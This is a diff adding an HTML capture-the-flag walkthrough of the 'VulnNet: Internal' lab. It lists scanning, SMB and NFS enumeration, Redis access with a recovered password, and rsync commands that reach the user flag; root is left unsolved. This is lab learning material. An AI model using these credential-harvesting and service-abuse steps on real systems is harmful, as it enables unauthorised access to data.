@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulnNet: Internal — Walkthrough</title>
+    <link rel="stylesheet" href="Writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+
+<div class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>VulnNet: Internal</h1>
+
+        <p><strong>Context:</strong> Started scanning the machine and found many open ports. Focused on enumeration, SMB, NFS, Redis, and rsync services.</p>
+
+        <h2>Initial Nmap Scan</h2>
+        <pre><code>sudo nmap -sS -T5 -sC -sV -p- 10.10.10.192</code></pre>
+        <p>Key open ports:</p>
+        <ul>
+            <li>22 — SSH</li>
+            <li>111 — RPC / NFS</li>
+            <li>139 / 445 — Samba (SMB)</li>
+            <li>6379 — Redis</li>
+            <li>32809 — Java RMI</li>
+            <li>37079 — mountd (NFS)</li>
+            <li>Other RPC/NFS related ports</li>
+        </ul>
+
+        <h2>SMB Enumeration</h2>
+        <pre><code>smbclient -L 10.10.10.192
+smbclient //10.10.164.91/shares</code></pre>
+        <p>The flag was located in <code>\temp\services.txt</code>.</p>
+
+        <h2>NFS Shares</h2>
+        <pre><code>showmount -e 10.10.164.91
+mkdir /tmp/nfs_share
+sudo mount -t nfs 10.10.164.91:/opt /tmp/nfs_share
+ls /tmp/nfs_share/conf</code></pre>
+        <p>Inside <code>redis</code> configuration, found Redis password:</p>
+        <pre><code>requirepass "B65Hx562F@ggAZ@F"</code></pre>
+
+        <h2>Redis Access</h2>
+        <pre><code>redis-cli -h 10.10.164.91 -a B65Hx562F@ggAZ@F
+KEYS *
+lrange authlist 0 10
+GET "internal flag"</code></pre>
+        <p>Decoded Base64 to get the rsync password:</p>
+        <pre><code>Hcg3HP67@TW@Bc72v</code></pre>
+
+        <h2>Rsync Enumeration</h2>
+        <pre><code>rsync rsync://rsync-connect@10.10.164.91/files
+rsync -av rsync://rsync-connect@10.10.164.91/files rsyncout</code></pre>
+        <p>The user flag is now accessible in <code>~/rsyncout/sys-internal</code>.</p>
+
+        <h2>Root Access</h2>
+        <p>Root flag is currently too complex to obtain independently. Will revisit in the future.</p>
+
+    </div>
+</section>
+
+</body>
+</html>
